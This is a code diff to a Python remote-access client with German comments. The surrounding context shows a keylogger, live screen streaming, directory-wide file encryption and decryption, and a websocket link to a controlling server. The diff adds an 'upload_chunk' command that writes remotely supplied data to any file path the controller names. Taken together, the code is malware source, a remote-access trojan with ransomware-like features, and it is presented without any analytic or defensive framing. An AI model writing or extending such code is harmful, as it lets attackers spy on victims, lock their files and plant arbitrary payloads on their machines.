@@ -20,6 +20,7 @@ import secrets
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.backends import default_backend
+import tempfile
 
 # pynput wird für den Keylogger benötigt
 try:
@@ -421,6 +422,9 @@ class ScreenStreamer:
 screen_streamer = ScreenStreamer()
 
 # --- Hauptlogik ---
+# --- Chunked Upload State ---
+CHUNKED_UPLOADS = {}
+
 async def process_commands(websocket):
     # VNC-Style: Screenstream bleibt aktiv, solange gestartet
     while True:
@@ -571,6 +575,45 @@ async def process_commands(websocket):
                     response["output"] = f"Entschlüsselung abgeschlossen für {len(files)} Dateien im Verzeichnis {path}."
                 except Exception as e:
                     response["output"] = f"Fehler bei Entschlüsselung: {e}"
+            elif action == "upload_chunk":
+                file_id = command.get("file_id")
+                chunk_index = command.get("chunk_index")
+                total_chunks = command.get("total_chunks")
+                filename = command.get("filename")
+                data_b64 = command.get("data")
+                original_filename = command.get("original_filename")
+                filesize = command.get("filesize")
+                # Initialisiere temporäre Datei für diesen Upload
+                if file_id not in CHUNKED_UPLOADS:
+                    temp_path = tempfile.NamedTemporaryFile(delete=False).name
+                    CHUNKED_UPLOADS[file_id] = {
+                        "path": temp_path,
+                        "received": set(),
+                        "total": total_chunks,
+                        "filename": filename,
+                        "original_filename": original_filename,
+                        "filesize": filesize,
+                    }
+                upload = CHUNKED_UPLOADS[file_id]
+                # Schreibe Chunk an richtige Stelle
+                with open(upload["path"], "ab") as f:
+                    f.write(base64.b64decode(data_b64))
+                upload["received"].add(chunk_index)
+                # Wenn alle Chunks da, verschiebe Datei an Ziel
+                if len(upload["received"]) == total_chunks:
+                    try:
+                        shutil.move(upload["path"], filename)
+                        msg = f"Datei erfolgreich gespeichert: {filename} ({filesize} Bytes, {total_chunks} Chunks)"
+                        del CHUNKED_UPLOADS[file_id]
+                    except Exception as e:
+                        msg = f"Fehler beim Speichern der Datei: {e}"
+                    response = {"type": "command_output", "output": msg}
+                    await websocket.send(json.dumps(response))
+                else:
+                    # Optional: Fortschritt melden
+                    response = {"type": "debug", "msg": f"Chunk {chunk_index+1}/{total_chunks} empfangen für {filename}"}
+                    await websocket.send(json.dumps(response))
+                continue
             else:
                 response["status"] = "error"
                 response["error"] = "Unbekannte Aktion"
@@ -694,4 +737,3 @@ async def connect_to_server():
 
 if __name__ == "__main__":
     asyncio.run(connect_to_server())
-    
